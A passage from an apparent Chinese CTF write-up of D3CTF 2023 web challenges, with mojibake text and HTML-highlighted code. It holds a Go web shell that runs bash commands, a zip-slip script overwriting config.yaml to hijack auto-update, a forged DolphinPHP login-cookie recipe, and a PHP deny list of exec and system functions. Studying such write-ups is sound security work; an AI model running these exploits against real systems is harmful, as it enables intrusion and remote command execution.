class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µå¯¹é™æ€æ–‡ä»¶åšäº†äº›å¤„ç†ï¼Œä»–ç›´æ¥å°±æ²¡å¯¹../è¿›è¡Œå¤„ç†ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä»»æ„ç›®å½•ç©¿è¶Šï¼Œä¹Ÿå°±æ˜¯ä¸€å¼€å§‹æˆ‘ä»¬ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè¯»å–å®Œåå†æ³¨æ„ä¸€ä¸‹controlleré‡Œçš„è¿™ä¸€æ®µ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">gorm.Model</span><br><span class="line">Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹åº”çš„user.goå¦‚ä¸Šï¼Œæ˜¯ä¸€ä¸ªstructï¼Œä½†æ˜¯é‡Œé¢æœ‰ä¸€ä¸ªå­—æ®µéœ€è¦æ³¨æ„</p><p><img src="../images/image-20230507162913703.png" alt="image-20230507162913703"></p><p>ç»™äº† gorm.model å°±è¯´æ˜è‡ªå¸¦deletedatå­—æ®µï¼Œä¹Ÿå°±æ˜¯æœ‰è½¯åˆ é™¤è¿™ä¹ˆä¸€è¯´ï¼Œè½¯åˆ é™¤ä¹Ÿå°±æ˜¯éå®é™…åˆ é™¤æ•°æ®åº“æ•°æ®ï¼Œè€Œæ˜¯å•çº¯æ— æ³•æŸ¥è¯¢å‡ºæ¥ã€‚ç»“åˆä¸€ä¸‹ä¸Šé¢çš„æºç ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ä»¥adminç™»å½•ç„¶åå»ä¸Šä¼ zipæ–‡ä»¶ï¼Œå› æ­¤æˆ‘ä»¬åº”è¯¥è½¯é“¾æ¥å…ˆåˆ é™¤ä¸€ä¸‹adminï¼š</p><p>è¿™é‡Œçš„è¯adminæ˜¯æ•°æ®åº“ä¸­çš„ç¬¬ä¸€ä¸ªç”¨æˆ·</p><p><img src="../images/image-20230507164038666.png" alt="image-20230507164038666"></p><p><img src="../images/image-20230507164030525.png" alt="image-20230507164030525"></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><p><img src="../images/image-20230507164129892.png" alt="image-20230507164129892"></p><p>ä¹‹åç™»å½•testå°±æ˜¯ç®¡ç†å‘˜äº†ï¼Œå› ä¸ºä»£ç é‡Œçš„é€»è¾‘æ˜¯IDä¸º1çš„ç”¨æˆ·å°±æ˜¯ç®¡ç†å‘˜ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±å¥½è¯´äº†ï¼Œç”±é¢˜ç›®ä¸­config.goå’Œmain.goå¯ä»¥å¾—çŸ¥å®ç°äº†çƒ­éƒ¨ç½²</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¥½è¯´äº†ï¼Œæˆ‘ä»¬å¯ä»¥è¦†ç›–config.yamlå®ç°è‡ªæ›´æ–°ï¼Œä»¥ä¸‹æ˜¯chatgpté—®ç­”</p><p><a href="https://boogipop.com/2023/05/06/D3CTF%20x%20AntCTF%202023%20Web%20%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/#d3go">å‚è€ƒboogipopå¸ˆå‚…çš„</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">overseer.Run(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.POST(<span class="string">&quot;/shell&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">output, err := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, c.PostForm(<span class="string">&quot;cmd&quot;</span>)).CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(<span class="number">500</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(output))</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err := r.RunListener(state.Listener); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯æ¶æ„çš„goæ–‡ä»¶ï¼ŒæŠŠä»–ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶åï¼Œè¿˜éœ€è¦å‡†å¤‡ä¸€ä¸ªyamlæ–‡ä»¶</p><p>ä¸‹é¢è¿™ä¸ªæ˜¯åŸæœ¬çš„config.yamlæ–‡ä»¶</p><p><img src="../images/image-20230507164810114.png" alt="image-20230507164810114"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  noAdminLogin: <span class="literal">true</span></span><br><span class="line">database:</span><br><span class="line">  user: root</span><br><span class="line">  password: root</span><br><span class="line">  host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  port: <span class="number">3306</span></span><br><span class="line">update:</span><br><span class="line">  enabled: <span class="literal">true</span></span><br><span class="line">  url: http:<span class="comment">//127.0.0.1:8080/unzipped/shell</span></span><br><span class="line">  interval: <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¹‹ååˆ©ç”¨zipslipå»è¦†ç›–æ–‡ä»¶ï¼Œå› ä¸ºé¢˜ç›®å¹¶æ²¡æœ‰å¯¹unzipåšå¤„ç†ï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¦†ç›–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;exp.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##ç”Ÿæˆçš„zipæ–‡ä»¶</span></span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;exp.zip&quot;</span>)</span><br><span class="line">        zipFile.write(<span class="string">&quot;E:\\CTFLearning\\d3ctf\\d3go\\trueexp\\shell\\config.yaml&quot;</span>, <span class="string">&quot;../../config.yaml&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##å‹ç¼©çš„æ–‡ä»¶å’Œåœ¨zipä¸­æ˜¾ç¤ºçš„æ–‡ä»¶å</span></span><br><span class="line">        zipFile.write(<span class="string">&quot;./shell&quot;</span>, <span class="string">&quot;../shell&quot;</span>, zipfile.ZIP_DEFLATED)  <span class="comment">##å‹ç¼©çš„æ–‡ä»¶å’Œåœ¨zipä¸­æ˜¾ç¤ºçš„æ–‡ä»¶å</span></span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>ç„¶åå°†ç”Ÿæˆçš„æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šå°±å¯ä»¥æˆåŠŸrceäº†</p><h2 id="d3dolphin"><a href="#d3dolphin" class="headerlink" title="d3dolphin"></a>d3dolphin</h2><p><strong>æç¤ºï¼š</strong></p><p><strong>æ²¡æœ‰å¿…è¦è›®åŠ›ã€‚ç®¡ç†å‘˜è‡ªä»ä»–å†™æ—¥å¿—åå°±å†ä¹Ÿæ²¡æœ‰å‡ºç°è¿‡ã€‚</strong></p><p><strong>ç®¡ç†å‘˜é€šè¿‡ç®€å•åœ°æŒ‰ç…§ <a href="https://github.com/ssteveez/dolphin/blob/main/README.md">https://github.com/ssteveez/dolphin/blob/main/README.md</a> æ‰€è¯´çš„å†…å®¹æ¥ä¿®è¡¥é”™è¯¯</strong></p><p>é¢˜ç›®</p><p><img src="../images/image-20230505201032755.png" alt="image-20230505201032755"></p><p><img src="../images/image-20230505201049807.png" alt="image-20230505201049807"></p><p>ç»™äº†ä¸ªCVE   ç„¶åå‘Šè¯‰ä½ è¿™é‡Œä½¿ç”¨äº†è¡¥ä¸æ¥ä¿®å¤è¿™ä¸ªCVE</p><p>signin_token å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡æä¾›â½¤â¼¾åã€id å’Œâ½¤â¼¾ [last_login_time] æ¥æš´â¼’ç ´è§£</p><p><strong>å› ä¸ºadminçš„ç”¨æˆ·å¯†ç ä¸çŸ¥é“ï¼Œäºæ˜¯å°±å»ä¸‹è½½æºç æ¥è¿›è¡ŒæŸ¥çœ‹</strong></p><p><img src="../images/image-20230505211453158.png" alt="image-20230505211453158"></p><p>å‘ç°ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;is_signin&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ¤æ–­æ˜¯å¦ç™»å½•</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> è”¡ä¼Ÿæ˜ &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_signin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$user</span>)) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦è®°ä½ç™»å½•</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?uid&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;?signin_token&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$UserModel</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">                <span class="variable">$user</span> = <span class="variable">$UserModel</span>::<span class="title function_ invoke__">get</span>(<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;uid&#x27;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">                    <span class="variable">$signin_token</span> = <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>[<span class="string">&#x27;username&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="variable">$user</span>[<span class="string">&#x27;last_login_time&#x27;</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;signin_token&#x27;</span>) == <span class="variable">$signin_token</span>) &#123;</span><br><span class="line">                        <span class="comment">// è‡ªåŠ¨ç™»å½•</span></span><br><span class="line">                        <span class="variable">$UserModel</span>-&gt;<span class="title function_ invoke__">autoLogin</span>(<span class="variable">$user</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">session</span>(<span class="string">&#x27;user_auth_sign&#x27;</span>) == <span class="title function_ invoke__">data_auth_sign</span>(<span class="variable">$user</span>) ? <span class="variable">$user</span>[<span class="string">&#x27;uid&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ ¹æ®log.txtï¼Œadminçš„last_login_timeæ˜¯2011-04-05 14:19:19ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥â½£æˆâ¼€ä¸ªsigning_tokenï¼š</p><p>è¿™é‡Œéœ€è¦çš„æ˜¯æ—¶é—´æˆ³  æ‰€ä»¥<strong>2011-04-05 14:19:19</strong>çš„æ—¶é—´æˆ³ä¸º1301984359</p><p><img src="../images/image-20230505211707879.png" alt="image-20230505211707879"></p><p>ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;data_auth_sign&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ•°æ®ç­¾åè®¤è¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data è¢«è®¤è¯çš„æ•°æ®</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> è”¡ä¼Ÿæ˜ &lt;314013107<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">data_auth_sign</span>(<span class="params"><span class="variable">$data</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// æ•°æ®ç±»å‹æ£€æµ‹</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">            <span class="variable">$data</span> = (<span class="keyword">array</span>)<span class="variable">$data</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ’åº</span></span><br><span class="line">        <span class="title function_ invoke__">ksort</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// urlç¼–ç å¹¶ç”Ÿæˆqueryå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="variable">$code</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="comment">// ç”Ÿæˆç­¾å</span></span><br><span class="line">        <span class="variable">$sign</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$sign</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è¿›è¡Œç­¾åçš„ä¼ªé€ äº†</p><p><img src="../images/image-20230505214149350.png" alt="image-20230505214149350"></p><p>è¿™é‡Œä¸ºäº†é¿å…idå’Œæ—¶é—´æˆ³çš„æ··æ·†ï¼Œäºæ˜¯è¿™é‡Œå°±å¯ä»¥ä½¿ç”¨åˆ†+å·æ¥è¿›è¡Œåˆ†å‰²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;0=admin1&quot;</span> . <span class="string">&quot;1301984359&quot;</span>;  <span class="comment">// è¦è®¡ç®— SHA-1 å“ˆå¸Œçš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$h</span> = <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha1&quot;</span>, <span class="variable">$s</span>);  <span class="comment">// è®¡ç®— SHA-1 å“ˆå¸Œå€¼</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$h</span>;  <span class="comment">// è¾“å‡ºï¼šab5f486a24426d9158c99507da45ae3bac476dd6</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç”Ÿæˆcookieåï¼Œå°±å¯ä»¥è¿›è¡Œä¼ªé€ ç™»å½•äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cookie: </span><br><span class="line">dolphin_uid=1;</span><br><span class="line">dolphin_signin_token=ab5f486a24426d9158c99507da45ae3bac476dd6</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505214607572.png" alt="image-20230505214607572"></p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨é€šé…ç¬¦ï¼Œäºæ˜¯åå­—å°±å¯ä»¥è¿™æ ·å–</p><p><img src="../images/image-20230505214838155.png" alt="image-20230505214838155"></p><p>æ·»åŠ cookieåå°±å¯ä»¥æˆåŠŸè¿›è¡Œç™»å½•äº†</p><p>è¿™é‡Œçš„ç‰ˆæœ¬æ˜¯v1.5.1ï¼Œäºæ˜¯å¯ä»¥å»æŸ¥çœ‹ä¸Šä¸€ä¸ªç‰ˆæœ¬çš„æ¼æ´ï¼Œçœ‹è¿™ä¸ªç‰ˆæœ¬ä¿®å¤äº†å•¥ï¼Œç„¶ååœ¨é€šè¿‡çœ‹å®˜æ–¹çš„ä¿®å¤æœ‰æ²¡æœ‰æ¼æ´ï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥è¿›è¡Œç»•è¿‡</p><p>æ ¹æ®<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ï¼ŒDolphinphp v1.5.0å­˜åœ¨RCEæ¼æ´ï¼Œä½œè€…é€šè¿‡ç®€ å•æ·»åŠ å‡½æ•°â¿Šåå•çš„â½…å¼å¯¹å…¶è¿›â¾äº†ä¿®è¡¥ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | æµ·è±šPHPæ¡†æ¶ [ DolphinPHP ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | ç‰ˆæƒæ‰€æœ‰ 2016~2019 å¹¿ä¸œå“é”è½¯ä»¶æœ‰é™å…¬å¸ [ http://www.zrthink.com ]</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// | å®˜æ–¹ç½‘ç«™: http://dolphinphp.com</span></span><br><span class="line"><span class="comment">// +----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// æ‹’ç»ieè®¿é—®</span></span><br><span class="line">    <span class="string">&#x27;deny_ie&#x27;</span>       =&gt; <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// æ¨¡å—ç®¡ç†ä¸­ï¼Œä¸è¯»å–æ¨¡å—ä¿¡æ¯çš„ç›®å½•</span></span><br><span class="line">    <span class="string">&#x27;except_module&#x27;</span> =&gt; [<span class="string">&#x27;common&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;extra&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;install&#x27;</span>],</span><br><span class="line">    <span class="comment">// ç¦ç”¨å‡½æ•°</span></span><br><span class="line">    <span class="string">&#x27;disable_functions&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;passthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;exec&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chroot&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;chgrp&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popen&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_alter&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;ini_restore&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dl&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;openlog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;syslog&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;readlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;symlink&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;popepassthru&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;phpinfo&#x27;</span></span><br><span class="line">    ]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230505215639032.png" alt="image-20230505215639032"></p><p>ç›´æ¥å»æŸ¥çœ‹å®˜æ–¹å‘å¸ƒçš„è¡¥ä¸å°±è¡Œäº†</p><p>CVE-2023-0935 æ˜¯ä½¿â½¤ shell_exec ç»•è¿‡ CVE-2021-46097 2. æ ¹æ®<a href="https://www.cvedetails.com/cve/CVE-2021-46097/">https://www.cvedetails.com/cve/CVE-2021-46097/</a> ï¼ŒDolphinphp v1.5.0å­˜åœ¨RCEæ¼æ´ï¼Œä½œè€…é€šè¿‡ç®€ å•æ·»åŠ å‡½æ•°â¿Šåå•çš„â½…å¼å¯¹å…¶è¿›â¾äº†ä¿®è¡¥ã€‚ ç„¶åä½¿â½¤ç™»å½•ç®¡ç†â»”â¼¾ 